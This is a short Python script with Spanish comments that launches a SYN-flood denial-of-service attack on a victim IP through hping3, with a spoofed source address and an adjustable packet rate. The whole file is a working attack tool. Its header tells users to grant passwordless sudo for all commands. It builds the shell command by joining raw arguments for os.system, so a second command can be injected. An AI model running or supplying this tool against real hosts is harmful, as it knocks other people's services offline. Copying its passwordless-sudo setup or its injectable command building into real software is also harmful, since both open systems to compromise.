#!/usr/bin/python
# -*- coding: cp1252 -*-

# Autor: Gabriel Maciá
# Fecha: 14/12/2015


## IMPORTANTE: 
# Para ejecutar este script en una maquina hay que habilitar sudo sin contraseña insertando en 
# /etc/sudoers.d un fichero con el contenido nesg ALL=(ALL:ALL) NOPASSWD:ALL
# Adicionalmente, también hay que instalar hping3 en la máquina que origina el ataque. sudo apt-get install hping3

import sys
import logging
import os
import argparse
import time
import subprocess

##########################################
# DEFINICION DE VARIABLES Y CONSTANTES
##########################################

LOGFILENAME = 'DoS_attack.log'
LOGLEVEL = logging.DEBUG
LOGDIR = './'

##########################################

if __name__ == '__main__':


    logging.basicConfig(
                        filename=LOGDIR + time.strftime('%y%m%d_%H.%M.%S_')+ LOGFILENAME,
                        level=logging.DEBUG,
                        format='%(asctime)s %(name)-12s %(levelname)-8s %(message)s'
                        )
    log = logging.getLogger("DoSAttack")

    parser = argparse.ArgumentParser (description='Execute a DoS attack against a victim using hping3')
    parser.add_argument(dest='ipVictim', metavar='ipVictim', action='store', help='IP address of the victim', nargs=1)
    parser.add_argument('-p', dest='destPort', metavar='destPort', action='store', default=80, type=int, help='default: 80 (http)')
    parser.add_argument('--speed', dest='attackSpeed', metavar='attackSpeed', action='store', choices=['fast','faster'], default='fast', help='fast or flood')
    parser.add_argument('-s', dest='spoofingIP', metavar='spoofingIP', action='store', help='source IP for the attack')
    args = parser.parse_args()

    
    if args.attackSpeed == 'fast':
        speed = ' -i u10000'    # Ataque fast a velocidad de 1 paquete/0.01s --> 100 paquetes/s
    else:
        speed = ' -i u100'      # Ataque faster a velocidad de 1 paquete/0.0001s --> 10000 paquetes/s



    log.info ('Iniciando DoS Attack contra ' + args.ipVictim[0] + ' a las: ' + time.strftime('%X %d/%m/%y'))
    
    # TODO: Comprobar si el ejecutable hping3 está instalado en la maquina. Se asume por ahora que lo está y está en el path
    
    installed = True
    try: 
        subprocess.check_output('which hping3', shell=True)
    except subprocess.CalledProcessError as e:
        installed = False
        print 'hping3 is not installed in your system. Please, install it'
        exit(-1)
    
    command = ('sudo hping3 -w 64 -S -d 120' +  
                ' -p ' + str(args.destPort) + 
                ' -a ' + args.spoofingIP + 
                speed + 
                ' ' + args.ipVictim[0])
    log.info ('Ejecutando comando: ' + command)
    os.system(command)
    log.info ('Fin de ataque a las: ' + time.strftime('%X %d/%m/%y'))